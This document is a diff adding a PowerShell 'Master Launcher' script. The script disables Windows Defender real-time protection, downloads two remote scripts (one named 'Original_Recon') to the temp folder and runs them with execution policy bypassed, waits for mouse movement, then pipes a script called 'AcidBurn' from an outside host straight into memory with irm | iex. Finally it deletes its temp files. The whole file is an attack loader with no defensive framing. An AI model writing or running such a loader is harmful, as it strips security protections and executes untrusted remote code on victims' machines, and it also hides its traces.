@@ -1,0 +1,105 @@
+# Set Execution Policy
+Set-ExecutionPolicy RemoteSigned -Scope Process -Force
+
+Write-Host "=== Starting Master Launcher (WITH DEFENDER DISABLE) ==="
+
+# ---- DISABLE WINDOWS DEFENDER ----
+function Disable-Defender {
+    try {
+        Write-Host "Checking Windows Defender status..."
+
+        $defenderStatus = Get-MpPreference
+        if ($defenderStatus.DisableRealtimeMonitoring -eq $false) {
+            Write-Host "Defender real-time protection is ACTIVE. Attempting to disable..."
+
+            Set-MpPreference -DisableRealtimeMonitoring $true
+            Write-Host "Defender real-time protection disabled successfully!"
+        } else {
+            Write-Host "Defender real-time protection is already disabled."
+        }
+    } catch {
+        Write-Host "Failed to disable Defender. May require Admin rights or is locked by Group Policy."
+    }
+}
+
+# Disable Defender immediately
+Disable-Defender
+
+# ------------------------------------
+
+# Define URLs
+$urls = @(
+    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/Original_Recon", # Part 1
+    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/video_scare.txt"  # Part 2
+)
+
+$tempPaths = @(
+    "$env:TEMP\part1.ps1",
+    "$env:TEMP\part2.ps1"
+)
+
+# Download Part 1 and Part 2
+for ($i = 0; $i -lt $urls.Count; $i++) {
+    Write-Host "Downloading Part $($i + 1)..."
+    try {
+        Invoke-WebRequest -Uri $urls[$i] -OutFile $tempPaths[$i] -UseBasicParsing -ErrorAction Stop
+        Write-Host "Downloaded Part $($i + 1) successfully."
+    } catch {
+        Write-Host "Failed to download Part $($i + 1). Exiting..."
+        exit
+    }
+}
+
+# Run Part 1
+Write-Host "Running Part 1..."
+try {
+    $process = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[0])`"" -PassThru
+    $process.WaitForExit()
+    Write-Host "Part 1 completed."
+} catch {
+    Write-Host "Failed to run Part 1."
+    exit
+}
+
+# Wait for mouse movement
+Write-Host "Waiting for mouse movement..."
+Add-Type -AssemblyName System.Windows.Forms
+$initialPosition = [System.Windows.Forms.Cursor]::Position
+do {
+    Start-Sleep -Milliseconds 500
+    $currentPosition = [System.Windows.Forms.Cursor]::Position
+} while ($initialPosition.X -eq $currentPosition.X -and $initialPosition.Y -eq $currentPosition.Y)
+Write-Host "Mouse movement detected."
+
+# Run Part 2
+Write-Host "Running Part 2..."
+try {
+    $process = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[1])`"" -PassThru
+    $process.WaitForExit()
+    Write-Host "Part 2 completed."
+} catch {
+    Write-Host "Failed to run Part 2."
+    exit
+}
+
+# Small delay before AcidBurn starts
+Write-Host "Waiting 2 seconds before starting AcidBurn..."
+Start-Sleep -Seconds 2
+
+# Launch AcidBurn directly into memory
+Write-Host "Launching AcidBurn script directly from memory..."
+try {
+    irm https://jakoby.lol/zyg | iex
+    Write-Host "AcidBurn script launched successfully!"
+} catch {
+    Write-Host "Failed to launch AcidBurn."
+}
+
+# Cleanup Part 1 and Part 2 temp files
+Write-Host "Cleaning up temp files..."
+foreach ($script in $tempPaths) {
+    Remove-Item -Path $script -Force -ErrorAction SilentlyContinue
+}
+
+Write-Host "Master Launcher fully complete. Exiting cleanly."
+exit
